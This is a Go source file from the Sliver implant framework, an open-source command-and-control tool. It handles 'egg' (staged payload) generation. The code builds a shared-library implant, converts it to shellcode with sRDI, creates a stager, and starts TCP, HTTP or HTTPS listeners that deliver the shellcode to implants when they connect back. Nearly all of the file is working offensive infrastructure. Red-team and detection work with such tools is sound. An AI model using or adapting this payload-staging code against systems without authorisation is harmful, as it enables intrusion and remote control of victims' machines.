package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"sync"

	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/c2"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"
)

// Egg - Generate a sliver "egg" i.e. staged payload
func (rpc *Server) Egg(ctx context.Context, req *clientpb.EggReq) (*clientpb.Egg, error) {

	// Create sRDI shellcode
	config := generate.ImplantConfigFromProtobuf(req.Config)
	config.Format = clientpb.ImplantConfig_SHARED_LIB
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		return nil, err
	}
	sliverShellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver", "")
	if err != nil {
		return nil, err
	}
	// Create stager shellcode
	filename := fmt.Sprintf("%s_egg.bin", config.Name)
	stage, err := rpc.MsfStage(req.EConfig)
	if err != nil {
		return nil, err
	}

	// Start c2 listener
	var jobID int
	switch req.EConfig.Protocol {
	case clientpb.EggConfig_TCP:
		jobID, err = jobStartEggTCPListener(req.EConfig.Host, uint16(req.EConfig.Port), sliverShellcode)
		if err != nil {
			return nil, err
		}
	case clientpb.EggConfig_HTTP:
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", req.EConfig.Host, req.EConfig.Port),
			LPort:  uint16(req.EConfig.Port),
			Domain: req.EConfig.Host,
			Secure: false,
			ACME:   false,
		}
		job, err := jobStartEggHTTPListener(conf, sliverShellcode)
		if err != nil {
			return nil, err
		}
		jobID = job.ID
	case clientpb.EggConfig_HTTPS:
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", req.EConfig.Host, req.EConfig.Port),
			LPort:  uint16(req.EConfig.Port),
			Domain: req.EConfig.Host,
			Secure: true,
			ACME:   false,
		}
		job, err := jobStartEggHTTPListener(conf, sliverShellcode)
		if err != nil {
			return nil, err
		}
		jobID = job.ID
	default:
		return nil, fmt.Errorf("Protocol not supported")
	}

	return &clientpb.Egg{
		JobID:    uint32(jobID),
		Filename: filename,
		Data:     stage,
	}, nil
}

// StartEggTCPListener - Start a TCP egg (i.e. staged) payload listener
func jobStartEggTCPListener(host string, port uint16, shellcode []byte) (int, error) {
	ln, err := c2.StartTCPListener(host, port, shellcode)
	if err != nil {
		return -1, err // If we fail to bind don't setup the Job
	}

	job := &core.Job{
		ID:          core.NextJobID(),
		Name:        "TCP",
		Description: "Raw TCP listener (egg only)",
		Protocol:    "tcp",
		Port:        port,
		JobCtrl:     make(chan bool),
	}

	go func() {
		<-job.JobCtrl
		rpcLog.Infof("Stopping TCP listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.Remove(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.Add(job)

	return job.ID, nil
}

// jobStartEggHTTPListener - Start an HTTP(S) egg (i.e. staged) payload listener
func jobStartEggHTTPListener(conf *c2.HTTPServerConfig, data []byte) (*core.Job, error) {
	server, err := c2.StartHTTPSListener(conf)
	if err != nil {
		return nil, err
	}
	name := "http"
	if conf.Secure {
		name = "https"
	}
	server.SliverShellcode = data
	job := &core.Job{
		ID:          core.NextJobID(),
		Name:        name,
		Description: fmt.Sprintf("Egg handler %s for domain %s", name, conf.Domain),
		Protocol:    "tcp",
		Port:        uint16(conf.LPort),
		JobCtrl:     make(chan bool),
	}
	core.Jobs.Add(job)

	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.Remove(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		var err error
		if server.Conf.Secure {
			if server.Conf.ACME {
				err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
			} else {
				err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
			}
		} else {
			err = server.HTTPServer.ListenAndServe()
		}
		if err != nil {
			rpcLog.Errorf("%s listener error %v", name, err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}
	}()

	go func() {
		<-job.JobCtrl
		once.Do(func() { cleanup(nil) })
	}()

	return job, nil
}
